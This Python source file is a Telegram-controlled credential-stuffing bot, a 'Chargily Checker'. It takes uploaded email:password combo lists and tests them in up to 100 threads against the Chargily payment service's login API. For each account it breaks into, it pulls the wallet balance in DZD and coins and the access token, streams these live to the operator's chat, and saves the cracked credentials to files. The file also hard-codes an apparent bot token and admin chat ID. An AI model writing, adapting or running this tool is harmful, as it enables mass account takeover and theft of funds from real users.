#!/usr/bin/env python3
"""
Chargily Checker — Full Telegram Bot Control
Send combos → bot processes → live results stream → all via inline buttons
"""
import os
import sys
import json
import time
import threading
import asyncio
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    BotCommand
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode

# ======================= CONFIG =======================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8745017792:AAGs4T5CBhi3Wfrre_XLbxjirsF4cGiEu_4")
ADMIN_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "6207431030").strip()

LOGIN_URL = "https://app2.chargily.net/api/v1/auth/login"
WALLET_URL = "https://app2.chargily.net/api/v1/user/wallet"
REQUEST_TIMEOUT = 15
DELAY_BETWEEN_REQUESTS = 0.3

OUTPUT_DIR = os.getenv("OUTPUT_DIR", "./output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

HEADERS = {
    "accept": "application/json",
    "content-type": "application/json",
    "origin": "https://app.chargily.com",
    "referer": "https://app.chargily.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
}

# ======================= GLOBAL STATE =======================
class CheckerState:
    def __init__(self):
        self.running = False
        self.stop_flag = False
        self.threads = 20
        self.total = 0
        self.processed = 0
        self.good = 0
        self.valid = 0
        self.bad = 0
        self.blocked = 0
        self.total_dzd = 0.0
        self.total_cc = 0.0
        self.combos = []
        self.start_time = None
        self.chat_id = None
        self.live_hits = []          # (email, pass, dzd, cc, operator, token)
        self.live_valids = []
        self.live_blocked = []
        self.lock = threading.Lock()
        self.progress_msg_id = None
        self.last_progress_update = 0

STATE = CheckerState()

# ======================= CORE CHECKER =======================
def check_login(email, password):
    payload = {"email": email, "password": password}
    try:
        resp = requests.post(LOGIN_URL, json=payload, headers=HEADERS, timeout=REQUEST_TIMEOUT)
        try:
            data = resp.json()
        except Exception:
            return "ERROR", {"message": f"Non-JSON: {resp.text[:100]}"}, None
        if resp.status_code in (200, 201):
            token = None
            if "data" in data and isinstance(data["data"], dict):
                token = data["data"].get("access_token") or data["data"].get("token")
            if not token:
                token = data.get("access_token") or data.get("token")
            if token:
                return "GOOD", data, token
            return "ERROR", data, None
        msg = data.get("message", "") or data.get("error", "") or str(data)
        ml = msg.lower()
        if "does not match" in ml or "wrong password" in ml:
            return "VALID_EMAIL", data, None
        elif "user not found" in ml or "not registered" in ml:
            return "INVALID", data, None
        elif "too many attempts" in ml or "blocked" in ml:
            return "BLOCKED", {"message": msg}, None
        return "ERROR", {"message": msg}, None
    except requests.exceptions.Timeout:
        return "ERROR", {"message": "Timeout"}, None
    except requests.exceptions.ConnectionError:
        return "ERROR", {"message": "Connection Error"}, None
    except Exception as e:
        return "ERROR", {"message": str(e)}, None


def fetch_wallet(token):
    headers = HEADERS.copy()
    headers["authorization"] = f"Bearer {token}"
    try:
        resp = requests.get(WALLET_URL, headers=headers, timeout=REQUEST_TIMEOUT)
        if resp.status_code == 200:
            return resp.json()
        return {"error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"error": str(e)}


def extract_balance(wallet):
    dzd, cc = 0, 0
    if isinstance(wallet, dict):
        for key in ("balance", "total_balance", "amount", "dzd"):
            if key in wallet:
                try:
                    dzd = float(wallet[key]); break
                except Exception:
                    pass
        for key in ("cc", "coins", "credit", "chargily_coins"):
            if key in wallet:
                try:
                    cc = float(wallet[key]); break
                except Exception:
                    pass
    return dzd, cc


def process_account(email, password, bot_loop, bot_app):
    """Runs in worker thread. Sends live updates via the bot."""
    if STATE.stop_flag:
        return "STOPPED"

    status, data, token = check_login(email, password)

    with STATE.lock:
        STATE.processed += 1

    if status == "GOOD":
        wallet = fetch_wallet(token)
        dzd, cc = extract_balance(wallet)
        operator = wallet.get("operator") or wallet.get("operator_name") or "N/A"

        with STATE.lock:
            STATE.good += 1
            STATE.total_dzd += dzd
            STATE.total_cc += cc
            STATE.live_hits.append((email, password, dzd, cc, operator, token))

        # live hit message
        msg = (
            f"<b>✅ HIT</b>\n"
            f"<code>{email}:{password}</code>\n"
            f"💰 DZD: <b>{dzd}</b> | CC: <b>{cc}</b>\n"
            f"🏦 Operator: <b>{operator}</b>\n"
            f"🔑 Token: <code>{token[:50]}...</code>"
        )
        asyncio.run_coroutine_threadsafe(
            safe_send(bot_app, STATE.chat_id, msg), bot_loop
        )

    elif status == "VALID_EMAIL":
        with STATE.lock:
            STATE.valid += 1
            STATE.live_valids.append((email, password))
        msg = f"<b>⚠️ VALID EMAIL</b>\n<code>{email}:{password}</code>"
        asyncio.run_coroutine_threadsafe(
            safe_send(bot_app, STATE.chat_id, msg), bot_loop
        )

    elif status == "BLOCKED":
        with STATE.lock:
            STATE.blocked += 1
            STATE.live_blocked.append((email, password))
        msg = f"<b>🚫 BLOCKED</b>\n<code>{email}:{password}</code>"
        asyncio.run_coroutine_threadsafe(
            safe_send(bot_app, STATE.chat_id, msg), bot_loop
        )

    elif status == "INVALID":
        with STATE.lock:
            STATE.bad += 1

    else:
        with STATE.lock:
            STATE.bad += 1

    time.sleep(DELAY_BETWEEN_REQUESTS)
    return status


async def safe_send(app, chat_id, text):
    try:
        await app.bot.send_message(
            chat_id=chat_id, text=text, parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )
    except Exception as e:
        print(f"[!] send error: {e}")


# ======================= KEYBOARDS =======================
def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 Send Combo File", callback_data="menu_send")],
        [
            InlineKeyboardButton("▶️ Start Check", callback_data="menu_start"),
            InlineKeyboardButton("⏹ Stop", callback_data="menu_stop"),
        ],
        [
            InlineKeyboardButton("📊 Stats", callback_data="menu_stats"),
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings"),
        ],
        [
            InlineKeyboardButton("📁 Results", callback_data="menu_results"),
            InlineKeyboardButton("🗑 Clear Results", callback_data="menu_clear"),
        ],
        [InlineKeyboardButton("ℹ️ Help", callback_data="menu_help")],
    ])


def settings_kb():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Threads -5", callback_data="set_thr_minus"),
            InlineKeyboardButton(f"Threads: {STATE.threads}", callback_data="noop"),
            InlineKeyboardButton("Threads +5", callback_data="set_thr_plus"),
        ],
        [
            InlineKeyboardButton("Delay -0.1s", callback_data="set_dly_minus"),
            InlineKeyboardButton(f"Delay: {DELAY_BETWEEN_REQUESTS:.1f}s", callback_data="noop"),
            InlineKeyboardButton("Delay +0.1s", callback_data="set_dly_plus"),
        ],
        [InlineKeyboardButton("⬅️ Back", callback_data="menu_back")],
    ])


def results_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Good Hits", callback_data="res_good")],
        [InlineKeyboardButton("⚠️ Valid Emails", callback_data="res_valid")],
        [InlineKeyboardButton("🚫 Blocked", callback_data="res_blocked")],
        [InlineKeyboardButton("❌ Invalid/Errors", callback_data="res_bad")],
        [InlineKeyboardButton("📦 Send All Files", callback_data="res_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="menu_back")],
    ])


# ======================= COMMAND HANDLERS =======================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = update.effective_chat.id
    STATE.chat_id = chat_id

    if ADMIN_CHAT_ID and str(chat_id) != str(ADMIN_CHAT_ID):
        await update.message.reply_text("⛔ Unauthorized.")
        return

    await update.message.reply_text(
        f"<b>🤖 Chargily Checker Bot</b>\n\n"
        f"Welcome <b>{user.first_name}</b>.\n\n"
        f"<b>Quick Start:</b>\n"
        f"1️⃣ Send me a <code>.txt</code> combo file (email:pass)\n"
        f"2️⃣ Press ▶️ <b>Start Check</b>\n"
        f"3️⃣ Watch live hits stream in\n\n"
        f"Use the buttons below.",
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu_kb()
    )


async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🏠 <b>Main Menu</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu_kb()
    )


# ======================= FILE HANDLER =======================
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    STATE.chat_id = chat_id

    if ADMIN_CHAT_ID and str(chat_id) != str(ADMIN_CHAT_ID):
        await update.message.reply_text("⛔ Unauthorized.")
        return

    doc = update.message.document
    if not doc:
        return
    if not doc.file_name.lower().endswith((".txt", ".csv")):
        await update.message.reply_text("❌ Only .txt or .csv files accepted.")
        return

    status_msg = await update.message.reply_text("📥 Downloading combo file...")

    try:
        tg_file = await doc.get_file()
        path = os.path.join(OUTPUT_DIR, f"combos_{int(time.time())}.txt")
        await tg_file.download_to_drive(path)

        combos = []
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if ":" in line:
                    e, p = line.split(":", 1)
                    combos.append((e.strip(), p.strip()))
                else:
                    combos.append((line, "dummy_pass"))

        STATE.combos = combos
        STATE.total = len(combos)

        await status_msg.edit_text(
            f"<b>✅ File loaded</b>\n"
            f"📄 <code>{doc.file_name}</code>\n"
            f"👥 Accounts: <b>{len(combos)}</b>\n\n"
            f"Press ▶️ <b>Start Check</b> to begin.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_kb()
        )

    except Exception as e:
        await status_msg.edit_text(f"❌ Error: <code>{e}</code>", parse_mode=ParseMode.HTML)


# ======================= CALLBACK ROUTER =======================
async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data
    chat_id = update.effective_chat.id
    STATE.chat_id = chat_id

    if data == "noop":
        return

    if data == "menu_back":
        await q.edit_message_text(
            "🏠 <b>Main Menu</b>", parse_mode=ParseMode.HTML,
            reply_markup=main_menu_kb()
        )
        return

    if data == "menu_send":
        await q.edit_message_text(
            "📤 <b>Send Combo File</b>\n\n"
            "Attach a <code>.txt</code> file with one <code>email:password</code> per line.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("⬅️ Back", callback_data="menu_back")
            ]])
        )
        return

    if data == "menu_start":
        if STATE.running:
            await q.edit_message_text("⚠️ Already running.", reply_markup=main_menu_kb())
            return
        if not STATE.combos:
            await q.edit_message_text("❌ No combo file loaded. Send one first.",
                                      reply_markup=main_menu_kb())
            return
        asyncio.create_task(run_check(context.application))
        await q.edit_message_text(
            f"🚀 <b>Check started</b> — {len(STATE.combos)} accounts, {STATE.threads} threads.\n"
            f"Live results will stream below.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_kb()
        )
        return

    if data == "menu_stop":
        if not STATE.running:
            await q.edit_message_text("Nothing running.", reply_markup=main_menu_kb())
            return
        STATE.stop_flag = True
        await q.edit_message_text("⏹ <b>Stopping...</b>", parse_mode=ParseMode.HTML,
                                  reply_markup=main_menu_kb())
        return

    if data == "menu_stats":
        await q.edit_message_text(stats_text(), parse_mode=ParseMode.HTML,
                                  reply_markup=main_menu_kb())
        return

    if data == "menu_settings":
        await q.edit_message_text(
            "⚙️ <b>Settings</b>", parse_mode=ParseMode.HTML,
            reply_markup=settings_kb()
        )
        return

    if data == "menu_results":
        await q.edit_message_text(
            "📁 <b>Results</b>\n\nChoose a category to download:",
            parse_mode=ParseMode.HTML,
            reply_markup=results_kb()
        )
        return

    if data == "menu_clear":
        with STATE.lock:
            STATE.live_hits.clear()
            STATE.live_valids.clear()
            STATE.live_blocked.clear()
            STATE.good = STATE.valid = STATE.bad = STATE.blocked = 0
            STATE.total_dzd = STATE.total_cc = 0.0
            STATE.processed = 0
        for f in ("good.txt", "valid.txt", "blocked.txt", "bad.txt"):
            try:
                os.remove(os.path.join(OUTPUT_DIR, f))
            except Exception:
                pass
        await q.edit_message_text("🗑 Cleared.", reply_markup=main_menu_kb())
        return

    if data == "menu_help":
        await q.edit_message_text(
            "<b>ℹ️ Help</b>\n\n"
            "• Send a .txt file with <code>email:password</code> lines\n"
            "• Press ▶️ Start to begin\n"
            "• Hits, valids, blocks stream live\n"
            "• Download results anytime from 📁 Results\n"
            "• Adjust threads/delay in ⚙️ Settings\n"
            "• ⏹ Stop halts after current batch",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_kb()
        )
        return

    if data == "set_thr_plus":
        STATE.threads = min(STATE.threads + 5, 100)
        await q.edit_message_text("⚙️ <b>Settings</b>", parse_mode=ParseMode.HTML,
                                  reply_markup=settings_kb())
        return
    if data == "set_thr_minus":
        STATE.threads = max(STATE.threads - 5, 5)
        await q.edit_message_text("⚙️ <b>Settings</b>", parse_mode=ParseMode.HTML,
                                  reply_markup=settings_kb())
        return
    if data == "set_dly_plus":
        global DELAY_BETWEEN_REQUESTS
        DELAY_BETWEEN_REQUESTS = round(DELAY_BETWEEN_REQUESTS + 0.1, 1)
        await q.edit_message_text("⚙️ <b>Settings</b>", parse_mode=ParseMode.HTML,
                                  reply_markup=settings_kb())
        return
    if data == "set_dly_minus":
        DELAY_BETWEEN_REQUESTS = max(round(DELAY_BETWEEN_REQUESTS - 0.1, 1), 0.0)
        await q.edit_message_text("⚙️ <b>Settings</b>", parse_mode=ParseMode.HTML,
                                  reply_markup=settings_kb())
        return

    # results
    if data.startswith("res_"):
        kind = data[4:]
        if kind == "all":
            files = [
                ("good.txt", "Good Hits"),
                ("valid.txt", "Valid Emails"),
                ("blocked.txt", "Blocked"),
                ("bad.txt", "Invalid/Errors"),
            ]
            sent = 0
            for name, cap in files:
                path = os.path.join(OUTPUT_DIR, name)
                if os.path.exists(path) and os.path.getsize(path) > 0:
                    with open(path, "rb") as f:
                        await context.bot.send_document(chat_id, f, caption=cap)
                    sent += 1
            if sent == 0:
                await context.bot.send_message(chat_id, "📭 No result files yet.")
            return

        path = os.path.join(OUTPUT_DIR, f"{kind}.txt")
        if not os.path.exists(path) or os.path.getsize(path) == 0:
            await context.bot.send_message(chat_id, f"📭 No {kind} results.")
            return
        with open(path, "rb") as f:
            await context.bot.send_document(chat_id, f, caption=kind.title())
        return


def stats_text():
    if STATE.start_time:
        elapsed = int(time.time() - STATE.start_time)
    else:
        elapsed = 0
    return (
        f"<b>📊 Stats</b>\n\n"
        f"⚡ Running: <b>{STATE.running}</b>\n"
        f"🧵 Threads: <b>{STATE.threads}</b>\n"
        f"⏱ Delay: <b>{DELAY_BETWEEN_REQUESTS:.1f}s</b>\n\n"
        f"👥 Total: <b>{STATE.total}</b>\n"
        f"🔁 Processed: <b>{STATE.processed}</b>\n"
        f"✅ Hits: <b>{STATE.good}</b>\n"
        f"⚠️ Valids: <b>{STATE.valid}</b>\n"
        f"🚫 Blocked: <b>{STATE.blocked}</b>\n"
        f"❌ Bad: <b>{STATE.bad}</b>\n\n"
        f"💰 DZD: <b>{STATE.total_dzd:.2f}</b>\n"
        f"💰 CC: <b>{STATE.total_cc:.2f}</b>\n"
        f"⏳ Elapsed: <b>{elapsed}s</b>"
    )


# ======================= RUN CHECK (async task) =======================
async def run_check(app: Application):
    if STATE.running:
        return
    STATE.running = True
    STATE.stop_flag = False
    STATE.start_time = time.time()

    chat_id = STATE.chat_id
    await app.bot.send_message(
        chat_id,
        f"<b>🚀 Started</b>\nAccounts: {len(STATE.combos)}\nThreads: {STATE.threads}",
        parse_mode=ParseMode.HTML
    )

    loop = asyncio.get_running_loop()
    bot = app.bot

    # progress updater
    async def progress_loop():
        msg = await bot.send_message(chat_id, "⏳ Starting...", parse_mode=ParseMode.HTML)
        while STATE.running:
            await asyncio.sleep(4)
            try:
                await msg.edit_text(stats_text(), parse_mode=ParseMode.HTML)
            except Exception:
                pass

    progress_task = asyncio.create_task(progress_loop())

    def worker_wrapper(email, password):
        return process_account(email, password, loop, bot)

    def run_pool():
        with ThreadPoolExecutor(max_workers=STATE.threads) as ex:
            futures = [ex.submit(worker_wrapper, e, p) for e, p in STATE.combos]
            for _ in as_completed(futures):
                if STATE.stop_flag:
                    break

    await loop.run_in_executor(None, run_pool)

    STATE.running = False
    progress_task.cancel()

    # write output files
    with open(os.path.join(OUTPUT_DIR, "good.txt"), "w", encoding="utf-8") as f:
        for e, p, dzd, cc, op, t in STATE.live_hits:
            f.write(f"{e}:{p} | DZD:{dzd} CC:{cc} | {op} | {t}\n")
    with open(os.path.join(OUTPUT_DIR, "valid.txt"), "w", encoding="utf-8") as f:
        for e, p in STATE.live_valids:
            f.write(f"{e}:{p}\n")
    with open(os.path.join(OUTPUT_DIR, "blocked.txt"), "w", encoding="utf-8") as f:
        for e, p in STATE.live_blocked:
            f.write(f"{e}:{p}\n")
    with open(os.path.join(OUTPUT_DIR, "bad.txt"), "w", encoding="utf-8") as f:
        f.write(f"Bad count: {STATE.bad}\n")

    await app.bot.send_message(
        chat_id,
        f"<b>🏁 Finished</b>\n\n" + stats_text(),
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu_kb()
    )


# ======================= APP SETUP =======================
async def post_init(app: Application):
    await app.bot.set_my_commands([
        BotCommand("start", "Open main menu"),
        BotCommand("menu", "Show main menu"),
        BotCommand("stats", "Show stats"),
    ])
    print("[+] Bot online.")


def main():
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("[!] Set TELEGRAM_BOT_TOKEN env var.")
        sys.exit(1)

    app = Application.builder().token(TELEGRAM_BOT_TOKEN).post_init(post_init).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("stats", lambda u, c: u.message.reply_text(stats_text(), parse_mode=ParseMode.HTML)))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CallbackQueryHandler(on_button))

    print("[+] Starting bot...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
